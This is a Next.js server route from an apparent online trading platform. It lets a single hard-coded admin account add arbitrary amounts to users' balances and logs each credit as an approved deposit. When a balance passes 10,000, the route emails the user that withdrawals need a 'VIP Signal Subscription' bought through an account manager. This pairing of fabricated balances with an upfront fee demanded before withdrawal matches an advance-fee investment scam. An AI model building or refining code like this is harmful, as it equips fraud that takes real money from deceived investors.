import { NextResponse } from 'next/server';
import { getServerSession } from 'next-auth';
import { authOptions } from '@/lib/auth';
import dbConnect from '@/lib/db';
import User from '@/models/User';
import Deposit from '@/models/Deposit';
import { sendBalanceAddedEmail, sendCustomTemplateEmail } from '@/lib/mail';

export async function POST(req: Request) {
    try {
        const session = await getServerSession(authOptions);
        if (!session?.user || session.user.email !== 'admintrader@crownedgebroker.pro') {
            return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
        }

        const { userId, amount } = await req.json();
        const creditAmount = Number(amount);

        if (!Number.isFinite(creditAmount) || creditAmount <= 0) {
            return NextResponse.json({ error: 'Invalid amount' }, { status: 400 });
        }

        await dbConnect();

        const user = await User.findById(userId);
        if (!user) {
            return NextResponse.json({ error: 'User not found' }, { status: 404 });
        }

        const oldBalance = user.balance;

        // Add money
        user.balance += creditAmount;
        await user.save();

        if (oldBalance < 10000 && user.balance >= 10000 && user.email) {
            await sendCustomTemplateEmail(
                user.email,
                "Action Required: VIP Signal Required",
                "Signal Purchase Required",
                `Your account profit has reached the 10,000 threshold. To continue trading and enable withdrawals, you must purchase a VIP Signal Subscription immediately. Please contact your account manager to purchase your signal.`
            );
        }

        // Record as an approved credit so it appears in ledger history without inflating trading P&L.
        await Deposit.create({
            userId,
            amountLocal: creditAmount,
            currency: user.currency || 'USD',
            method: 'ADMIN_CREDIT',
            status: 'APPROVED',
            receiptUrl: null,
        });


        // Send Email
        if (user.email) {
            await sendBalanceAddedEmail(user.email, creditAmount, user.currency || 'USD');
        }

        return NextResponse.json({ success: true, message: 'Money added successfully' });
    } catch (e: any) {
        return NextResponse.json({ error: e.message }, { status: 500 });
    }
}
